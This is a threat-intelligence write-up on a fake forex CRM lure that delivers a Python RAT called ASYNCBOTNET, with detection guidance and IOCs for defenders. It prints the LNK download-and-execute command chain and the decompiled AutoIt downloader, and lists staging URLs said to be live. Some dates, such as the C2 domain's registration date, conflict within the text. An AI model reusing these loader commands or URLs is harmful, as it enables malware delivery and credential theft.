---
title: "WealthGAF and ASYNCBOTNET: A Fake Forex CRM Brand Built to Deliver a Four-Stage Python RAT"
description: "A 2,253-byte ZIP posing as API documentation for a fake forex CRM delivers a four-stage chain: LNK trojan with conhost --headless hiding, a compiled AutoIt downloader, a PNG/ZIP polyglot Python bundle, and a previously undocumented Socket.IO RAT named ASYNCBOTNET that monitors 14 crypto wallets and 12 exchanges. A single TLS certificate ties WealthGAF to a 13-brand fake forex platform cluster, all sharing the same Kubernetes C2 origin."
pubDate: "2026-07-04T18:00:00"
permalink: "/2026/07/04/wealthgaf-asyncbotnet-forex-rat/"
tags: ["asyncbotnet", "wealthgaf", "autoit", "lnk-trojan", "python-rat", "socketio", "dropbox-staging", "forex-lure", "crypto-monitor", "infostealer", "threat-intel"]
---

A 2,253-byte ZIP is not a CRM documentation package. That was the first thought when this sample landed via an abuse.ch submission on 2 July 2026. The file is called `WealthGAF_CRM_API_Documentation.zip` — a name that implies pages of developer reference, endpoint specifications, request schemas. Real API documentation compresses to something north of 100KB even before you add the boilerplate. Two kilobytes means there is almost nothing inside. Except there is.

The SHA256 is `b570834a38ff9d5e085dc48700332e536635d23e7cfb9b93fe65be1ffb85e0f7`. By the time it was flagged, 24 of 75 engines on VirusTotal had caught it, tagged with `long-sleeps` and `detect-debug-environment`. That combination tells a story before you even open the file: this is something that knows it's being watched and tries to wait out the sandbox.

---

## Two shortcuts and a hidden console

Open the ZIP and you find two files. Not a PDF. Not a Word document. Two Windows shortcut files: `WealthGAF_CRM_API_Documentation.pdf.lnk` at 2,948 bytes, and `WealthGAF_CRM_API_Credentials.pdf.lnk` at 2,936 bytes. Both were created on 2 July 2026. Both carry the Edge browser application icon.

The double extension is a classic trick. Windows Explorer hides known file extensions by default, so `.lnk` disappears and a user sees `WealthGAF_CRM_API_Documentation.pdf` with what looks like a browser icon. For anyone expecting a PDF from a forex CRM vendor, that is convincing enough.

What the shortcuts actually execute is more interesting than the disguise. Both LNK files target `conhost.exe`, reached by climbing five directory levels with `..` chains — the kind of relative-path gymnastics that breaks naive string-matching detection. The arguments passed to `conhost.exe` are `--headless -- cmd.exe /c ...`.

`conhost.exe --headless` is legitimate Windows Host Process functionality, normally used to run console applications without a visible window when they're driven programmatically. Abusing it here means the command window never appears on screen. There is no CMD flash, no taskbar blip, nothing visible to the user. The decoy PDF opens in Edge and everything else happens silently in the background.

The command chain those two LNKs run is identical except for the decoy filename:

```
curl.exe -L -o "%USERPROFILE%\Documents\WealthGAF_CRM_API_Documentation.pdf" [Dropbox decoy PDF]
& start "" "%USERPROFILE%\Documents\WealthGAF_CRM_API_Documentation.pdf"
& curl.exe -L -o "C:\Users\Public\a.exe" [Dropbox AutoIt interpreter]
& curl.exe -L -o "C:\Users\Public\P.a3x" [Dropbox AutoIt script]
& cd /d "C:\Users\Public" & a.exe P.a3x
```

Three Dropbox downloads, all still live at time of writing. First, a professional-looking 8-page PDF that opens immediately to reassure the victim. While they're reading it, `curl` is fetching an AutoIt interpreter (`a_1782998350_4587.exe`, 926KB) and a compiled AutoIt script (`P_1782998350_4587.a3x`, 100KB) to `C:\Users\Public\`. Then it runs them together. The victim is looking at clean API documentation. The machine is already executing stage two.

The filename `1782998350` is not random. It's a Unix timestamp: 2026-07-02 06:39 UTC. Both the interpreter and the compiled script were built the same hour the ZIP was packaged, which puts together a tight operational picture — someone assembled the full chain in a single working session.

---

## Decompiling the AutoIt layer

The AutoIt interpreter binary (`98e4f904f7de1644e519d09371b8afcbbf40ff3bd56d76ce4df48479a4ab884b`) is a standard AutoIt3 runtime with one distinguishing feature: its PE signature has been deliberately invalidated. VirusTotal tags it `legit`/`invalid-signature`/`overlay`, which means the file is functionally a real AutoIt interpreter with its Authenticode signature stripped and additional data appended. Stripping the signature prevents simple certificate-trust checks from flagging it as a signed Microsoft binary while still making it look superficially legitimate.

The compiled script (`8bee9506f5d1e89cd0845d2c5d5f15fa63ee1316c9a2027b3707ee9cdd29c63f`) had zero detections at submission time. Running it through autoit-ripper produces 6,397 lines of decompiled AutoIt. The vast majority is boilerplate: imported standard library code from `String.au3`, `Array.au3`, and `Inet.au3`. The actual payload is at the very end, and it's brief:

```autoit
Global $T78IC7 = "https://www.dropbox.com/scl/fi/g05fy01rin9sh6kz" & "ospu6/21npmybj.zip?rlkey=8" & "aod0ao2od2405gv7au8nrhhu&dl=1"
Global $BOBLDD = "C:\" & "ProgramData\py.zip"
Global $JVHKZQ = "C:\ProgramData\WinUpdateC" & "ache"
Global $YFHNUF = $JVHKZQ & "\" & "logo.pn" & "g"
If Not FileExists ( $YFHNUF ) Then
    InetGet ( $T78IC7 , $BOBLDD , 1 )
    DirCreate ( $JVHKZQ )
    RunWait ( @ComSpec & " /c powershell -command ""Expand-Archive -Path " & $BOBLDD & " -DestinationPath " & $JVHKZQ & " -Force""" , "" , @SW_HIDE )
EndIf
FileChangeDir ( $JVHKZQ )
Run ( @ComSpec & " /c python.exe logo.png" , $JVHKZQ , @SW_HIDE )
```

The string concatenation is the evasion. The Dropbox URL is split across three string literals so that no static scanner sees the full URL in a single string. The path `C:\ProgramData\WinUpdateCache` is fragmented into `"C:\ProgramData\WinUpdateC"` and `"ache"`. Even `"logo.pn"` and `"g"` are split. This is belt-and-suspenders obfuscation on a script that already won't be scanned because it's a compiled `.a3x`, but the operator did it anyway.

The logic is a clean anti-reinfection check. Before downloading anything, the script looks for `C:\ProgramData\WinUpdateCache\logo.png`. If that file already exists, the entire download-and-extract block is skipped. This prevents repeated infections from tripping over each other and is also the reason the `long-sleeps` sandbox tag appeared on the outer ZIP — the script can simply do nothing if it decides the environment looks wrong, and a sandbox with a clean filesystem will see the file absent and proceed, but repeat runs after infection will silently exit.

If the file is absent: download `21npmybj.zip` (17MB) from Dropbox to `C:\ProgramData\py.zip`, create the `WinUpdateCache` directory, extract with PowerShell's `Expand-Archive`, then run `python.exe logo.png` from the extracted directory with the window hidden.

`python.exe logo.png`. That command is the most interesting line in this whole script.

---

## A PNG that is also a ZIP

The bundle `21npmybj.zip` (SHA256 `e4d546697cfceb764ab58e256edcdb3ee0000b89b08867d50600263d3eadf9d7`, zero VT detections) extracts a complete Python 3.11 runtime: `python.exe`, `python311.dll`, and all the standard library `.pyd` files. That's the 17MB. Among them sits `logo.png`, 135,216 bytes.

Open it in an image viewer and you get a legitimate 701×769 RGBA PNG — a logo graphic. Open it as a binary and look at the end: at offset 135,194, there is a ZIP End of Central Directory record. `logo.png` is a polyglot file. It passes PNG validation because the PNG header and IDAT chunks are completely valid. It is simultaneously a ZIP archive because Python's `zipimport` mechanism, when invoked by passing the filename to `python.exe`, ignores the PNG header and scans for the ZIP central directory signature.

When Python runs `python.exe logo.png`, Python finds the EOCD, treats the file as a ZIP, locates `__main__.py` inside, and executes it. The image viewer and Python's interpreter are reading the same 135KB file in completely different ways, and both succeed.

The rest of the extracted directory is equally deliberate:

- `client.config`: backup C2 details — `SERVER_IP=31.207.47.27`, `SERVER_PORT=8447`, `CLIENT_VERSION=1.1.1` — with a comment line that reads `# export ASYNCBOTNET_SERVER=...`. That comment is where the malware family gets its name.
- `encryption.key`: a Fernet symmetric key (`dtfwKu7AxQZespUVxzur9zWPChQ_PZzzPj_95jNTc4k=`) used for file operations.
- `system_info.py`: a victim fingerprint collector that pulls external IP, geolocation, CPU model, GPU, installed AV, privilege level, disk and memory stats, and network adapters.
- `proper_dependency_installer.py`: installs pip packages on demand, keyed to RAT capabilities — `pycryptodome` and `pywin32` for browser credential theft, `Pillow` for screenshots, `pyperclip` for clipboard and keylogging, `psutil` for process enumeration, `requests` for network operations.

The operator didn't bundle these dependencies. They're installed dynamically, keeping the initial ZIP smaller and making the full capability set invisible until specifically enabled by the operator after the victim is established.

---

## ASYNCBOTNET

`__main__.py`, extracted from the PNG/ZIP polyglot, contains a single `exec` call wrapping three nested `base64.b64decode` calls:

```python
exec(base64.b64decode(base64.b64decode(base64.b64decode('...'))))
```

Strip the three layers of base64 and you get 113,500 bytes of Python. The transport is `python-socketio` — Socket.IO over HTTPS — connecting to `https://naturevalleycloud.com`.

`naturevalleycloud.com` was registered on 2026-06-03 through Namecheap and is sitting behind Cloudflare, resolving to `104.21.3.183` and `172.67.131.21`. Four engines on VirusTotal have flagged it malicious: alphaMountain, Certego, Forcepoint, and SOCRadar. The Cloudflare fronting makes the traffic look like ordinary HTTPS to any resolver and hides the true origin server. The backup C2 in `client.config` — `31.207.47.27:8447` on Hostkey B.v. in the Netherlands — has a single Kaspersky malicious detection, which suggests it's been active long enough for at least one security vendor to notice.

The session encryption is XOR with a time-factored key. The hardcoded password `WinUpdate2025ServiceKey` is combined with the current Unix timestamp at message send time, then the payload is zlib-compressed before XOR. Each message carries its own timestamp so the server can regenerate the correct key on the receiving end. It's not cryptographically strong — XOR with a deterministic key is breakable — but it's enough to prevent trivial HTTPS inspection from extracting plaintext commands.

Persistence runs on every RAT launch, making it self-healing. The current version (0.0.4) copies `a.exe` → `C:\ProgramData\OneDrive\firefox.exe` and `P.a3x` → `C:\ProgramData\OneDrive\plugin.a3x`, then creates `OneDrive.lnk` in the startup folder pointing to `firefox.exe plugin.a3x` with `WindowStyle=7` (minimised, no taskbar icon) and the real OneDrive.exe icon if it finds one. The LNK description string reads "Microsoft OneDrive."

The uninstall routine tells you more about the operator than the malware does. The `cleanup_service` function carries a list of every persistence name this RAT has ever used: `firefox.bat`, `FirefoxUpdater.bat`, `FirefoxUpdater.vbs`, `FirefoxUpdater.ps1`, `RunFirefoxPS.bat`, `FirefoxUpdater.lnk`, and the current `OneDrive.vbs` / `OneDrive.lnk`. Scheduled tasks `FirefoxUpdaterService` and `OneDriveUpdateTask`. Registry Run keys `FirefoxUpdater`, `OneDrive_Update`, `OneDriveHelper`. The operator ships a cleanup function that knows about six generations of renamed persistence, two scheduled task names, and three registry key names — because the tool has been through all of them. Each rename was probably a reaction to detection. The `.bat` entries are the oldest layer; this thing started life as a batch file launcher and grew from there.

A persistent UUID stored in `C:\ProgramData\WinUpdateCache\machine_id` lets the server track individual victims across reconnections even when multiple machines share an external IP.

The Socket.IO command set covers the full spectrum of a remote access tool. The `welcome` event fires immediately on connection and sends the complete system fingerprint from `system_info.py`. After that, a 30-second heartbeat keeps the session alive. The operator can issue `execute_command` for arbitrary one-shot execution, `execute_shell_command` for an interactive shell that maintains per-session working directory state, and `take_screenshot` for screen captures via `PIL.ImageGrab`.

The `admin_command` channel handles privileged operations: `shutdown` and `restart` for power control, `uninstall` for clean self-removal, `get_task_list` and `terminate_task` for process management, and the full file system suite — `get_file_list`, `download_file`, `upload_file`, `delete_file`, `zip_folder`. The `install_dependencies` and `check_dependencies` commands trigger `proper_dependency_installer.py` to load `pycryptodome` and `pywin32`, enabling browser credential extraction. After credentials are pulled, `clear_chrome_data` wipes Chrome's profile data to destroy evidence.

The piece that sets ASYNCBOTNET apart from generic Python RATs is its application monitor. Every 12 to 17 seconds (a randomised interval to prevent timing-based detection), the RAT scans running processes and foreground window titles against a configurable watchlist. The default list is:

**Crypto wallet processes monitored**: Ledger Live, Trezor Suite, Exodus Wallet, Electrum, Trust Wallet, MetaMask App, Coinbase Wallet, Atomic Wallet, Wasabi Wallet, Sparrow Wallet, Bitcoin Core, Jaxx Liberty.

**Exchange and DeFi window titles monitored**: Binance, Crypto.com, Coinbase Web, Kraken, Bybit, KuCoin, OKX, Gemini, Bitfinex, Blockchain.com, Uniswap, OpenSea, and the web interfaces for MetaMask, Ledger, Trezor, and Electrum.

When a watched application becomes active, the RAT fires an `app_monitor_alert` event to the C2. Two conditions trigger an alert independently: the application just opened (always alerts immediately, regardless of cooldown) or the application has been open for 30 minutes since the last alert. The "newly opened" path is the important one — the operator gets notified the instant a victim launches any monitored wallet or navigates to an exchange, which is the moment to push a clipboard-hijacking or credential-theft command before the session closes. The operator can reconfigure the watchlist at runtime via `app_monitor_config`, so the default list can be tailored per victim. The picture it paints is clear: this is an infostealer campaign where the operator's primary objective is to be present when a victim accesses crypto assets.

The version string embedded in the code is `Stealth v0.0.4 (2026-07-02)`. The `0.0.4` tells you this is not someone's repurposed GitHub project. It's being iterated, and this build was cut on the same day the delivery ZIP was packaged. Then there's the debug log: the RAT writes `%TEMP%\WinUpdateSvc_debug.log` on every run — a plaintext record of every Socket.IO event processed, every command received, every persistence action taken. The C2 URL is in there. The exact system info the RAT transmitted is in there. Timestamps on everything. Leaving debug logging hot in a production implant is a real mistake, and if an incident responder finds that file, the investigation gets a lot shorter. A full operational history of the infection sitting in `%TEMP%`, written by the malware itself.

---

## The WealthGAF brand

The infrastructure behind this campaign is not improvised. `wealthgaf.info` was registered on 2026-03-19, more than three and a half months before the first sample was submitted to abuse.ch. It resolves to `151.158.1.223`, hosted on Evoxt Sdn. Bhd. in Malaysia (AS149440), and is registered through Njalla — the privacy-first registrar that accepts Monero and is specifically designed to prevent registrant identification. Google Workspace MX records and a Google site verification tag indicate the operator set up legitimate-looking email infrastructure for the brand.

The site itself presents as "Omega Trade," a full fake forex broker with marketing copy about "1500+ traders," regulatory compliance claims, and educational trading content. Within the Omega Trade story, "WealthGAF CRM" is the back-office system that forex affiliates use to manage their lead pipelines. This is an important detail about target selection.

The decoy PDF is eight pages of professional API documentation for a REST API at `api.wealthgaf.info`. The API takes leads through `/leads/add`, returns statuses via `/leads/status`, and lists existing leads at `/leads`. Authentication uses Bearer tokens with `wgf_live_sk_...` and `wgf_test_sk_...` key prefixes. The example leads target GB and AE markets — UK and UAE forex prospects. Campaign tracking codes in the documentation (`WGF_Q4_2026_MENA_CFD`, `WGF_Q4_2026_EU_Wealth`) suggest the operator is presenting WealthGAF as an active Q4 2026 campaign vehicle.

`api.wealthgaf.info` returns an nginx 404. The API doesn't exist. The documentation exists solely to convince a forex CRM developer or affiliate manager that they're setting up a real lead-generation integration.

The targets aren't ordinary retail forex traders. They're affiliate marketers and CRM developers who work with lead databases — people who have API credentials to back-end systems containing lead pipelines with names, emails, phone numbers, and trading profiles. A person integrating a forex CRM API has access to far more data than a retail trader does. That's the attack surface.

The Credentials LNK (`WealthGAF_CRM_API_Credentials.pdf.lnk`) makes the second-stage objective explicit. The promise of an API credentials document is specifically designed to lure someone who has just read the API documentation and wants the keys to start testing. Open the "credentials" file and the infection chain runs.

---

## The cluster behind the brand

WealthGAF is one fake brand. The TLS certificate on `wealthgaf.info` reveals there are twelve more.

The cert is issued for `api.wealthmvt.info` as the Common Name, but pull the Subject Alternative Names and you get 43 entries. Thirteen distinct fake forex platform brands, all sharing a single certificate:

```
assets-victory.co    blue-mg.info       cgfinance.cc
ft-group.co          igwm.pro           platform212.co
pswealth.cc          vtw25.com          wealthgaf.info
wealthmvt.info       wf-assets.cc       wm-gc.com
wm-if.com
```

Every brand gets `api.*` and `trader.*` subdomains in the cert, the same pattern as `api.wealthgaf.info` and `trader.wealthgaf.info`. The names are chosen carefully. `ft-group.co` leans on the Financial Times' initials. `platform212.co` echoes Trading 212. `wf-assets.cc` sits close enough to Wells Fargo that someone skimming an email might not look twice. None of this is accidental.

The domains themselves scatter across different IPs and hosting providers, some behind Cloudflare, some direct. But the shared certificate means all thirteen were provisioned from one place. The likely candidate is the Kubernetes cluster at `151.158.1.223` that also hosts `wealthgaf.info`. That server exposes the k8s default ingress cert — `CN=Kubernetes Ingress Controller Fake Certificate, O=Acme Co`, the placeholder that Kubernetes deploys when no real cert is configured. A containerised multi-tenant setup: one cluster, thirteen brand backends, routing handled by ingress rules.

Then comes the important part. `151.158.1.223` is also the origin server behind `naturevalleycloud.com` — the primary RAT C2. The fake platforms and the command-and-control infrastructure share a machine.

The cluster didn't appear overnight. `ft-group.co` was registered in November 2024. `pswealth.cc`, `platform212.co`, and `assets-victory.co` followed in early 2025. The 2026 additions — `igwm.pro`, `wf-assets.cc`, `vtw25.com` — are the newest. Eighteen months of fake brand construction, at minimum. WealthGAF, registered March 2026, is near the end of that timeline. The C2 domain `naturevalleycloud.com`, registered May 2026, was probably spun up specifically for this delivery campaign rather than for the broader platform infrastructure.

The overall shape of this is pig-butchering adjacent. The fake trading platforms exist to build credibility with targets and eventually extract deposits or access. The RAT delivery through the WealthGAF CRM lure is a parallel track: the operator is also getting inside the machines of forex affiliate managers and CRM developers, people who hold API keys to lead databases full of names, phone numbers, and trading profiles. Two angles on the same victim pool.

---

## Infrastructure and timeline

Three and a half months elapsed between brand registration and first sample. That's deliberate build-out time.

- **2026-03-19**: `wealthgaf.info` registered through Njalla.
- **2026-06-02**: ZIP timestamps on the Python 3.11 runtime files inside `21npmybj.zip` — the RAT and its dependencies were compiled this date.
- **2026-06-03**: `naturevalleycloud.com` C2 domain registered through Namecheap.
- **2026-06-04**: `system_info.py` last modified — the fingerprint module was still being refined a day after the C2 was registered.
- **2026-07-02, 06:18–06:22**: LNK files and `logo.png` finalised. Both LNKs, the outer ZIP, and the PNG/ZIP polyglot all carry creation timestamps in this four-minute window.
- **2026-07-04**: Sample submitted to abuse.ch.

The registrar choices are not accidental. Njalla for `wealthgaf.info` hides the registrant behind bulletproof privacy and accepts privacy-preserving payment methods. Namecheap for `naturevalleycloud.com` is a different registrar for the operational C2, separating the lure infrastructure from the command infrastructure. Both sit behind Cloudflare, so even if one domain is sinkholed, the operator can point DNS elsewhere and the Cloudflare-fronted traffic pattern doesn't change.

The backup C2 at `31.207.47.27` (HOSTKEY B.V., Amsterdam) is worth a second look. Shodan shows RPC on 135, SMB on 445, RDP on 3389, WinRM on 5986. That's not a Linux box running a Python Socket.IO server. That's a Windows machine. Port 8447 — the ASYNCBOTNET port from `client.config` — doesn't show up in external scans at all, suggesting it's filtered or only accessible locally. This is almost certainly the **operator's own Windows VPS**: the machine they RDP into to develop payloads, stage files, and run the RAT. The `31.207.47.27:8447` entry in `client.config` is probably a dev endpoint, something that makes sense from within that machine and not from the open internet. The actual production C2 is elsewhere.

That production C2 is `151.158.1.223` — the Kubernetes cluster. `naturevalleycloud.com` resolves behind Cloudflare to that same host as `wealthgaf.info`. The operator is running the fake forex platform and the RAT command infrastructure off the same box, separated only by ingress routing rules.

---

## Detection notes

The outer ZIP is small enough that any mail gateway doing content inspection on archive sizes should flag it. 2,253 bytes for a document claiming to be CRM API documentation is an anomaly worth alerting on.

The LNK files are detectable by their targets: `conhost.exe` with `--headless` as an argument is not a pattern that appears in legitimate LNK files. Any EDR or file analysis tool that inspects LNK targets and arguments should catch this immediately.

The AutoIt decompilation signature `AU3!EA06` identifies the `.a3x` as AutoIt 3.3.16+ compiled bytecode. The zero-detection rate on VirusTotal for the `.a3x` file at submission time shows this format remains a reliable obfuscation vehicle. Behavioural detection — specifically, `a.exe` spawning a hidden `cmd.exe` that calls PowerShell's `Expand-Archive` — is more reliable than static scanning.

`python.exe logo.png` as a process launch from `C:\ProgramData\WinUpdateCache\` is a high-confidence indicator. Python executing a file with a `.png` extension from a non-standard ProgramData subdirectory should not occur legitimately.

The persistence drops at `C:\ProgramData\OneDrive\firefox.exe` and startup VBS/LNK entries named `OneDrive.vbs` / `OneDrive.lnk` are detectable via standard persistence monitoring. The cleanup of old `FirefoxUpdater.*` entries during RAT launch means defenders hunting for older variant indicators may find their cleanup already done for them.

For network detection: Socket.IO connection patterns (the initial polling handshake followed by upgrade to WebSocket over HTTPS) to a domain registered within the last 60 days should be examined. `naturevalleycloud.com` has a 31-day-old registration at time of first submission, which falls squarely inside standard new-domain alerting windows. The full fake platform cluster — 13 domains in the shared TLS cert — should all be blocked.

Incident responders should look for `%TEMP%\WinUpdateSvc_debug.log`. If it exists, it contains a timestamped record of every C2 command the operator issued and every event the RAT processed since the last execution, including the server URL and the exact system information transmitted. This is an artefact the operator left on by accident and it significantly accelerates triage.

---

## IOCs

**Hashes**

| SHA256 | File | Note |
|--------|------|------|
| `b570834a38ff9d5e085dc48700332e536635d23e7cfb9b93fe65be1ffb85e0f7` | `WealthGAF_CRM_API_Documentation.zip` | Outer lure, 2,253 bytes |
| `ceb5922448414f746bf7eb81d730467dbf935541c8dd4c8ae16917995538ed5c` | `WealthGAF_CRM_API_Documentation.pdf.lnk` | Stage 1 LNK |
| `d3360060e7ceea72b77eac2cb6c08965636ed6acb841b8450269db05b8e045c2` | `WealthGAF_CRM_API_Credentials.pdf.lnk` | Stage 1 LNK |
| `98e4f904f7de1644e519d09371b8afcbbf40ff3bd56d76ce4df48479a4ab884b` | `a_1782998350_4587.exe` | AutoIt3 interpreter, invalid PE sig, imphash `07f236b4003a1f1174171e18cad3b475` |
| `8bee9506f5d1e89cd0845d2c5d5f15fa63ee1316c9a2027b3707ee9cdd29c63f` | `P_1782998350_4587.a3x` | Compiled AutoIt script |
| `e4d546697cfceb764ab58e256edcdb3ee0000b89b08867d50600263d3eadf9d7` | `21npmybj.zip` | Python 3.11 + RAT bundle, 17MB |
| `cef5c3db29b1b1dbc3e6779912ee33e2aa69823542035922714a934a514f0f40` | `WealthGAF_CRM_API_Documentation.pdf` | Decoy, 8 pages |

**Network**

| Type | Indicator | Note |
|------|-----------|------|
| Domain | `naturevalleycloud.com` | Primary C2, Cloudflare-fronted, Namecheap, registered 2026-05-31 |
| Domain | `wealthgaf.info` | Fake forex CRM brand, Njalla, registered 2026-03-19 |
| Domain | `api.wealthgaf.info` | Fake API endpoint (nginx 404) |
| IP | `151.158.1.223` | Kubernetes C2 origin — hosts both `wealthgaf.info` and `naturevalleycloud.com` |
| IP | `31.207.47.27` | Windows VPS operator machine, HOSTKEY B.V. Amsterdam (RDP/SMB/WinRM) |
| IP | `104.21.3.183` | Cloudflare anycast — `naturevalleycloud.com` |
| IP | `172.67.131.21` | Cloudflare anycast — `naturevalleycloud.com` |

**Fake forex platform cluster (shared TLS cert)**

```
assets-victory.co  blue-mg.info  cgfinance.cc  ft-group.co
igwm.pro  platform212.co  pswealth.cc  vtw25.com  wealthgaf.info
wealthmvt.info  wf-assets.cc  wm-gc.com  wm-if.com
```

**Staging URLs (Dropbox — live at time of writing)**

```
https://www.dropbox.com/scl/fi/0063nq3gemmruffc77oum/a_1782998350_4587.exe?rlkey=6h8c8anx4qqqdr284fma25fy0&dl=1
https://www.dropbox.com/scl/fi/dwsl2oin75cucbk3xgj27/P_1782998350_4587.a3x?rlkey=c3mm1rx1i5visse8u8wtbt0wp&dl=1
https://www.dropbox.com/scl/fi/g05fy01rin9sh6kzospu6/21npmybj.zip?rlkey=8aod0ao2od2405gv7au8nrhhu&dl=1
https://www.dropbox.com/scl/fi/qtq8fi6lbzso0qk3hdnr5/WealthGAF_CRM_API_Documentation.pdf?rlkey=0e8aukx0avwk028s7dxib1ib7&dl=1
```

**Host artefacts**

| Path | Note |
|------|------|
| `C:\ProgramData\WinUpdateCache\` | Stage 3 extraction directory |
| `C:\ProgramData\WinUpdateCache\logo.png` | PNG/ZIP polyglot — anti-reinfection marker |
| `C:\ProgramData\WinUpdateCache\machine_id` | Persistent victim UUID |
| `C:\ProgramData\py.zip` | Stage 3 bundle download path |
| `C:\ProgramData\OneDrive\firefox.exe` | RAT persistent copy (renamed `a.exe`) |
| `C:\ProgramData\OneDrive\plugin.a3x` | AutoIt loader persistent copy (renamed `P.a3x`) |
| `%APPDATA%\...\Startup\OneDrive.lnk` | Current persistence (LNK, OneDrive icon) |
| `%APPDATA%\...\Startup\OneDrive.vbs` | Legacy persistence (template present, not active in v0.0.4) |
| `%TEMP%\WinUpdateSvc_debug.log` | Operational log — full C2 event history, commands, timestamps |

**Legacy artefacts (earlier variants)**

```
Startup\FirefoxUpdater.bat, .vbs, .ps1, .lnk, RunFirefoxPS.bat
Scheduled tasks: FirefoxUpdaterService, OneDriveUpdateTask
Registry Run: FirefoxUpdater, OneDrive_Update, OneDriveHelper
```

**Strings**

| String | Note |
|--------|------|
| `WinUpdate2025ServiceKey` | XOR session encryption password |
| `dtfwKu7AxQZespUVxzur9zWPChQ_PZzzPj_95jNTc4k=` | Fernet key (`encryption.key`) |
| `Stealth v0.0.4 (2026-07-02)` | RAT version string |
| `WinUpdateSvc_debug.log` | Debug log filename |
